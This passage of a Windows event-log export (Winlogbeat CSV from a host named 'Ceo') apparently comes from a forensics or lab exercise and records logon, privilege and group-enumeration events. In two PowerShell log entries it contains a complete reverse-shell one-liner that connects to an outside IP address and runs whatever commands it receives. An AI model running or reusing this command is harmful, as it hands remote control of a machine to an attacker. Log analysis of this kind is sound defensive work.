	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=5.1.19041.1682
	RunspaceId=e66962fe-4311-46da-bb61-0d6336ad933d
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=16

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ebfa8c85-e2b0-44f2-918c-b588a32c3077
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=5.1.19041.1682
	RunspaceId=e66962fe-4311-46da-bb61-0d6336ad933d
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4632,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:11:42.132","83kcBIQByII7dpeEwDU_",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 17:11:44.060","Oct 23, 2022 @ 17:11:43.933",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x26c
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",620,"-","SYSTEM, CEO$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"6,332","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28801,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 17:11:42.132","9HkcBIQByII7dpeEwDU_",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 17:11:44.060","Oct 23, 2022 @ 17:11:43.934",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"6,332","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28802,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 17:11:42.097",8nkcBIQByII7dpeEvDVO,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 17:11:43.049","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3916,"-","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:47.647",jHkbBIQByII7dpeE6TSk,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","user-member-enumerated",iam,4799,"Oct 23, 2022 @ 17:10:49.136","Oct 23, 2022 @ 17:10:48.995",event,success,"Microsoft-Windows-Security-Auditing","group, info","-","-","-","-","-",Builtin,"S-1-5-32-544",Administrators,"x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		S-1-5-32-544
	Group Name:		Administrators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x188c
	Process Name:		C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","CEO$","-","-","-",WORKGROUP,"S-1-5-18","CEO$","CEO$","{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-",0x188c,"C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18",Builtin,"-","-","-","-","-","S-1-5-32-544",Administrators,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4799,"Audit Success","-","-","-",0x3e7,"-",Info,656,"6,912","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28799,"Security Group Management","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:47.647",jXkbBIQByII7dpeE6TSk,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","user-member-enumerated",iam,4799,"Oct 23, 2022 @ 17:10:49.136","Oct 23, 2022 @ 17:10:48.995",event,success,"Microsoft-Windows-Security-Auditing","group, info","-","-","-","-","-",Builtin,"S-1-5-32-551","Backup Operators","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		S-1-5-32-551
	Group Name:		Backup Operators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x188c
	Process Name:		C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","CEO$","-","-","-",WORKGROUP,"S-1-5-18","CEO$","CEO$","{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-",0x188c,"C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18",Builtin,"-","-","-","-","-","S-1-5-32-551","Backup Operators","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4799,"Audit Success","-","-","-",0x3e7,"-",Info,656,"6,912","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28800,"Security Group Management","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:47.646",i3kbBIQByII7dpeE6TSk,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","user-member-enumerated",iam,4799,"Oct 23, 2022 @ 17:10:49.136","Oct 23, 2022 @ 17:10:48.995",event,success,"Microsoft-Windows-Security-Auditing","group, info","-","-","-","-","-",Builtin,"S-1-5-32-551","Backup Operators","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		S-1-5-32-551
	Group Name:		Backup Operators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x188c
	Process Name:		C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","CEO$","-","-","-",WORKGROUP,"S-1-5-18","CEO$","CEO$","{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-",0x188c,"C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18",Builtin,"-","-","-","-","-","S-1-5-32-551","Backup Operators","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4799,"Audit Success","-","-","-",0x3e7,"-",Info,656,"6,912","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28798,"Security Group Management","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:47.645",inkbBIQByII7dpeE6TSk,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","user-member-enumerated",iam,4799,"Oct 23, 2022 @ 17:10:49.136","Oct 23, 2022 @ 17:10:48.994",event,success,"Microsoft-Windows-Security-Auditing","group, info","-","-","-","-","-",Builtin,"S-1-5-32-544",Administrators,"x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		S-1-5-32-544
	Group Name:		Administrators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x188c
	Process Name:		C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","CEO$","-","-","-",WORKGROUP,"S-1-5-18","CEO$","CEO$","{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-",0x188c,"C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18",Builtin,"-","-","-","-","-","S-1-5-32-544",Administrators,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4799,"Audit Success","-","-","-",0x3e7,"-",Info,656,"6,912","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28797,"Security Group Management","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:47.644",iHkbBIQByII7dpeE6TSk,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","user-member-enumerated",iam,4799,"Oct 23, 2022 @ 17:10:49.136","Oct 23, 2022 @ 17:10:48.994",event,success,"Microsoft-Windows-Security-Auditing","group, info","-","-","-","-","-",Builtin,"S-1-5-32-544",Administrators,"x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		S-1-5-32-544
	Group Name:		Administrators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x188c
	Process Name:		C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","CEO$","-","-","-",WORKGROUP,"S-1-5-18","CEO$","CEO$","{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-",0x188c,"C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18",Builtin,"-","-","-","-","-","S-1-5-32-544",Administrators,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4799,"Audit Success","-","-","-",0x3e7,"-",Info,656,"6,912","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28795,"Security Group Management","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:47.644",iXkbBIQByII7dpeE6TSk,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","user-member-enumerated",iam,4799,"Oct 23, 2022 @ 17:10:49.136","Oct 23, 2022 @ 17:10:48.994",event,success,"Microsoft-Windows-Security-Auditing","group, info","-","-","-","-","-",Builtin,"S-1-5-32-551","Backup Operators","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		S-1-5-32-551
	Group Name:		Backup Operators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x188c
	Process Name:		C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","CEO$","-","-","-",WORKGROUP,"S-1-5-18","CEO$","CEO$","{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-",0x188c,"C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18",Builtin,"-","-","-","-","-","S-1-5-32-551","Backup Operators","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4799,"Audit Success","-","-","-",0x3e7,"-",Info,656,"6,912","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28796,"Security Group Management","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:47.640",hnkbBIQByII7dpeE6TSk,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","user-member-enumerated",iam,4799,"Oct 23, 2022 @ 17:10:49.136","Oct 23, 2022 @ 17:10:48.993",event,success,"Microsoft-Windows-Security-Auditing","group, info","-","-","-","-","-",Builtin,"S-1-5-32-544",Administrators,"x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		S-1-5-32-544
	Group Name:		Administrators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x188c
	Process Name:		C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","CEO$","-","-","-",WORKGROUP,"S-1-5-18","CEO$","CEO$","{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-",0x188c,"C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18",Builtin,"-","-","-","-","-","S-1-5-32-544",Administrators,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4799,"Audit Success","-","-","-",0x3e7,"-",Info,656,"6,912","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28793,"Security Group Management","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:47.640",h3kbBIQByII7dpeE6TSk,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","user-member-enumerated",iam,4799,"Oct 23, 2022 @ 17:10:49.136","Oct 23, 2022 @ 17:10:48.993",event,success,"Microsoft-Windows-Security-Auditing","group, info","-","-","-","-","-",Builtin,"S-1-5-32-551","Backup Operators","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		S-1-5-32-551
	Group Name:		Backup Operators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x188c
	Process Name:		C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","CEO$","-","-","-",WORKGROUP,"S-1-5-18","CEO$","CEO$","{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-",0x188c,"C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18",Builtin,"-","-","-","-","-","S-1-5-32-551","Backup Operators","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4799,"Audit Success","-","-","-",0x3e7,"-",Info,656,"6,912","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28794,"Security Group Management","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:47.621",hHkbBIQByII7dpeE6TSk,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 17:10:49.136","Oct 23, 2022 @ 17:10:48.991",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x26c
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",620,"-","SYSTEM, CEO$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"6,332","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28791,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 17:10:47.621",hXkbBIQByII7dpeE6TSk,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 17:10:49.136","Oct 23, 2022 @ 17:10:48.992",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
